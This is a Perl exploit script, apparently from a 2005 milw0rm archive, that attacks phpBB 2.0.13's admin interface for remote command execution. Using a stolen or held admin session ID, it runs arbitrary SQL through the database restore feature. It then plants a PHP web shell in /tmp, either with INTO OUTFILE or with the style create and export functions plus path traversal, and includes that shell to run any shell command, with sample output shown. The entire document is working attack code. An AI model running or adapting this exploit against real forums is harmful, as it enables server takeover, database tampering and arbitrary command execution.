#!/usr/bin/perl

### r57phpbb_admin2exec.pl                                                      
### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### phpBB admin_styles.php commands execution exploit                           
### tested on phpBB 2.0.13                                                      
### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### by 1dt.w0lf                                                                 
### RST/GHC                                                                     
### http://rst.void.ru                                                          
### http://ghc.ru                                                               
### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### screen
### r57phpbb_admin2exec.pl -p http://blah.com/phpBB/admin/ -s 0864cb0abb396319c589ebc2a98c2c5d -c get_prefix
### -----------------------------------------------------------------------------------
### [~] Try to get prefix ...[ DONE ]
### PREFIX : phpbb_
### -----------------------------------------------------------------------------------
### 
### r57phpbb_admin2exec.pl -p http://blah.com/phpBB/admin/ -s 0864cb0abb396319c589ebc2a98c2c5d -P phpbb_
### -----------------------------------------------------------------------------------
### [!] Method 2 - use "create\export style"
### [~] Try to run sql query in database ... [ DONE ]
### [~] Creating new style ... [ DONE ]
### [~] Creating file ... [ DONE ]
### [+] File successfully created! Now you can try execute command!
### [~] Delete style from database ... [ DONE ]
### -----------------------------------------------------------------------------------
### 
### r57phpbb_admin2exec.pl -p http://blah.com/phpBB/admin/ -s 0864cb0abb396319c589ebc2a98c2c5d -c "uname -sr; id"
### -----------------------------------------------------------------------------------
### FreeBSD 5.3-RELEASE
### uid=80(www) gid=80(www) groups=80(www)
### -----------------------------------------------------------------------------------
### 20.04.2005

use LWP::UserAgent;
use Getopt::Std;

getopts("p:s:P:c:m:");

$path   = $opt_p;
$sid    = $opt_s;
$prefix = $opt_P || 'phpbb_'; 
$cmd    = $opt_c || 'create'; 
$method = $opt_m || 2;        

#################### LITTLE CONFIG
# forum on win or unix? commands split by ; or &&
$cmdspl = ';'; # unix
# filename for create. default is 'theme_info.cfg' for include in admin_styles.php?mode=addnew
# DONT CHANGE if you don't know that you do!!!
$filename = '/theme_info.cfg';
# folder for create file, we need folder writable for apache user, by default we use /tmp
$dir = '../../../../../../../../../../../../../../../../../../../../../tmp';
#################### END CONFIG

if(!$path || !$sid) { &usage; }

$xpl = LWP::UserAgent->new() or die;

if($cmd eq 'clear')
 {
 &show_header;
 print "-----------------------------------------------------------------------------------\n";
 print "[~] Clearing database ... ";
 $sql = 'DELETE FROM `'.$prefix.'themes` WHERE style_name="" AND template_name="";'; 
 $suc = &phpbb_sql_query("${path}admin_db_utilities.php?sid=$sid",$sql);
 if(!$suc) { print " [ FAILED ]\n"; exit(); }
 if($suc == 1) { print " [ DONE ]\n"; }
 print "-----------------------------------------------------------------------------------\n";
 exit();
 }

if($cmd eq 'create' && $method == 1)
 {
 &show_header;
 print "-----------------------------------------------------------------------------------\n";
 print "[!] Method 1 - use \"INTO OUTFILE\"\n";
 print "[!] Create file for including.\n";
 print "[~] Try to run sql query in database...";
 $sql   = 'SELECT \'<? passthru($_POST[jagajaga]); ?>\' FROM '.$prefix.'users LIMIT 1 INTO OUTFILE \''.$dir.$filename.'\';';
 $suc = &phpbb_sql_query("${path}admin_db_utilities.php?sid=$sid",$sql);
 if(!$suc) { print " [ FAILED ]\n"; exit(); }
 if($suc == 2) { print " [ DONE ]\n[!] File already exists! Now you can try execute command!\n"; }
 if($suc == 1) { print " [ DONE ]\n[+] File successfully created! Now you can try execute command!\n"; }
 print "-----------------------------------------------------------------------------------\n";
 exit();
 }

if($cmd eq 'get_prefix')
 {
 &show_header;
 print "-----------------------------------------------------------------------------------\n";
 print "[~] Try to get prefix ...";
 $res = $xpl->get(
 "${path}admin_db_utilities.php?perform=backup&additional_tables=&backup_type=structure&drop=0&backupstart=1&gzipcompress=0&startdownload=1&sid=$sid"
 );
 if($res->is_success && $res->content =~ /(TABLE: )(.*)(auth_access)/)
  { 
  $prefix = ($2)?($2):("No prefix");
  print "[ DONE ]\nPREFIX : $prefix\n"; 
  }
 else { print "[ FAILED ]\n"; }
 print "-----------------------------------------------------------------------------------\n";
 exit(0);
 }

if($cmd eq 'create' && $method == 2)
 {
 &show_header;
 print "-----------------------------------------------------------------------------------\n";
 print "[!] Method 2 - use \"create\\export style\"\n";
 print "[~] Try to run sql query in database ...";
 $sql   = 'ALTER TABLE `'.$prefix.'themes` CHANGE `template_name` `template_name` VARCHAR( 255 ) NOT NULL;';
 $suc = &phpbb_sql_query("${path}admin_db_utilities.php?sid=$sid",$sql);
 if(!$suc) { print " [ FAILED ]\n"; exit(); }
 if($suc == 1) { print " [ DONE ]\n"; }
 print "[~] Creating new style ...";
 $res = $xpl->post(
  "${path}admin_styles.php?sid=$sid",
  [
    'style_name'    => '0wn',
    'template_name' => 'a=12;passthru($_POST[jagajaga]);exit(0);//'.$dir,
    'mode'          => 'create',
    'submit'        => 'Save Settings'
  ],
 );
 if($res->is_success){ print " [ DONE ]\n[~] Creating file ..."; }
 else { print " [ FAILED ]\n"; exit(0); }
 $res = $xpl->post(
  "${path}admin_styles.php?sid=$sid",
  [
    'export_template' => 'a=12;passthru($_POST[jagajaga]);exit(0);//'.$dir,
    'mode'            => 'export',
    'edit'            => 'Submit'
  ],
 );
 if($res->is_success) { print " [ DONE ]\n[+] File successfully created! Now you can try execute command!\n"; }
 else { print " [ FAILED ]\n"; exit(0); }
 print "[~] Delete style from database ...";
 $sql   = 'DELETE FROM `'.$prefix.'themes` WHERE style_name="0wn";';
 &phpbb_sql_query("${path}admin_db_utilities.php?sid=$sid",$sql);
 print " [ DONE ]\n";
 print "-----------------------------------------------------------------------------------\n";
 exit(0);
 }

$jagajaga  = 'echo _GHC/RST_ ';
$jagajaga .= $cmdspl;
$jagajaga .= $cmd;
$jagajaga .= $cmdspl;
$jagajaga .= ' echo _GHC/RST_';

$res = $xpl->post(
 "${path}admin_styles.php?mode=addnew&sid=${sid}&install_to=${dir}",
  [
  'jagajaga' => "$jagajaga"
  ]
 );

&show_header;

if($res->content =~ /main\(\): Failed opening/) { print "[-] Error!\nFailed include file! Maybe you forgot create shell file first?\n"; exit(); }

@rez = split("_GHC/RST_",$res->content);
print "-----------------------------------------------------------------------------------\n";
print @rez[1];
print "-----------------------------------------------------------------------------------\n";

sub usage(){
 print "-----------------------------------------------------------------------------------\n";
 print "          phpBB admin_styles.php command execution exploit by 1dt.w0lf\n";
 print "-----------------------------------------------------------------------------------\n";
 print "Usage: $0 [options]\n";
 print "\nOptions:\n\n";
 print " -p  path to phpBB admin interface e.g. http://site.com/phpBB/admin/\n\n";
 print " -s  admin sid ... yeeesss you need admin rights for use this exploit =)\n\n";
 print " -P  database prefix (optional) default \"phpbb_\"\n\n";
 print " -c  [create|clear|get_prefix|(any unix/win command)]\n\n";
 print "     \"create\" for first create shell *default\n";
 print "     \"clear\" for delete our NULL styles from database\n";
 print "     \"get_prefix\" get table prefix\n";
 print "     \"any unix or win commands\" for commands execute =)\n\n"; 
 print " -m  method [1|2] (optional) default \"2\"\n\n";
 print "     1 - use mysql function \"INTO OUTFILE\" for creating new file\n";
 print "     2 - use phpBB functions \"create style\" and \"export style\" for create new file\n";
 print "-----------------------------------------------------------------------------------\n";
 print "           RST/GHC private stuff , http://rst.void.ru , http://ghc.ru\n";
 exit();
}

sub show_header()
{
print "-----------------------------------------------------------------------------------\n";
print "          phpBB admin_styles.php command execution exploit by RST/GHC\n";
print "-----------------------------------------------------------------------------------\n";
}

sub phpbb_sql_query($$){
$res = $xpl->post("$_[0]", 
Content_type => 'form-data',
Content      => [ 
                perform       => 'restore',
                restore_start => 'Start Restore',
                backup_file   => [ 
                                   undef,
                                   '0wneeeeedddd', 
                                   Content_type => 'text/plain',
                                   Content => "$_[1]", 
                                 ],
                ]
);
if ($res->is_success)
 {
 if ($res->content =~ /already exists/) { return 2; }
 if ($res->content =~ /The Database has been successfully restored/) { return 1; }
 }
return 0;
} 

# milw0rm.com [2005-10-11]
